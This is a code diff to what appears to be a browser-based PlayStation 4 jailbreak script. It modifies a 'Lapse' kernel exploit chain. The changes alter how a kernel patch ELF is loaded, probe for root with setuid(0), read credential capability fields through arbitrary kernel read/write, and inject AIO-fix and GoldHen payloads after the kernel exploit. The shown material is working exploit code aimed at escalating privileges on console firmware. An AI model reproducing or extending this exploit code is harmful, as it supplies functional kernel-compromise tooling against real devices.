@@ -4125,16 +4125,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
   ]);
-  const response = await fetch("900.elf");
-  if (!response.ok) {
-    throw new Error(`Failed to load 900.elf: ${response.status}`);
-  }
-  const buf = await response.arrayBuffer();
+  const buf = kpatch900_elf.buffer;
 //  const patch_elf_loc = './kpatch900.elf';
 //  const buf = await get_patches(patch_elf_loc);
   // FIXME handle .bss segment properly
   // assume start of loadable segments is at offset 0x1000
-  const patches = new View1(buf, 0x1000);
+  const patches = new View1(await buf, 0x1000);
   let map_size = patches.size;
   const max_size = 0x10000000;
   if (map_size > max_size) {
@@ -4945,21 +4941,16 @@ async function doJBwithPSFreeLapseExploit() {
       window.log("Global variables not properly initialized. Please restart console and try again...");
       return;
     }
-    
-    // Check if exploit was already loaded in this session
-    if (localStorage.ExploitLoaded === "yes" || sessionStorage.ExploitLoaded === "yes") {
-      window.log("GoldHen already loaded in this session !.");
-      window.log("\nKernel exploit succeeded");
-      window.log("AIO fixes applied");
-      window.log("GoldHen Loaded Successfully !...");
-      showMessage("GoldHen already loaded ! You can now select payloads.");
-      load_exploit_done();
-      localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
-      EndTimer();
-      return;
-    }
-    
     await lapse_init();
+    try {
+        if (chain.sys('setuid', 0) == 0) {
+            showMessage("GoldHen already loaded !..."),
+            window.log("GoldHen already loaded !.");
+            done_exploit();
+            return true;
+        }
+    }
+    catch (e) {}
 
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -4996,7 +4987,18 @@ async function doJBwithPSFreeLapseExploit() {
     window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
     const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
     window.log('Lapse STAGE 5/5: Patch kernel');
-    await patch_kernel(kbase, kmem, p_ucred, restore_info);
+    // Check if kernel is already patched by reading ucred caps
+    const cap0 = kmem.read64(p_ucred.add(0x60));
+    const cap1 = kmem.read64(p_ucred.add(0x68));
+    const already_patched = (cap0.low === -1 && cap0.high === -1 && cap1.low === -1 && cap1.high === -1);
+    
+    if (already_patched) {
+      window.log("\nKernel already patched (ucred caps = 0xFFFFFFFFFFFFFFFF), skipping patch...");
+    } else {
+      await patch_kernel(kbase, kmem, p_ucred, restore_info);
+      window.log("\nKernel patches applied");
+    }
+    
     close(unblock_fd);
     close(block_fd);
     free_aios2(groom_ids.addr, groom_ids.length);
@@ -5006,6 +5008,14 @@ async function doJBwithPSFreeLapseExploit() {
       close(sd);
     }
     window.log("\nKernel exploit succeeded");
+    await sleep(500); // Wait 500ms
+    // Inject aio_patches payload
+    jb_step_status = await PayloadLoader("aio_patches.bin", 0); // Read payload from Byte array
+    if (jb_step_status !== 1) {
+      window.log("Failed to load AIO fix!\nPlease restart console and try again...");
+      return;
+    }
+    window.log("AIO fixes applied");
     await sleep(500); // Wait 500ms
     // Inject HEN payload
     jb_step_status = await PayloadLoader("goldhen.bin", 1); // Read payload from .bin file
@@ -5018,7 +5028,7 @@ async function doJBwithPSFreeLapseExploit() {
     window.log("GoldHen Loaded Successfully !...");
     load_exploit_done();
     localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
-    EndTimer();    
+    EndTimer();   
   } catch (error) {
     window.log("An error occured during Lapse\nPlease restart console and try again...\nError definition: " + error);
   }
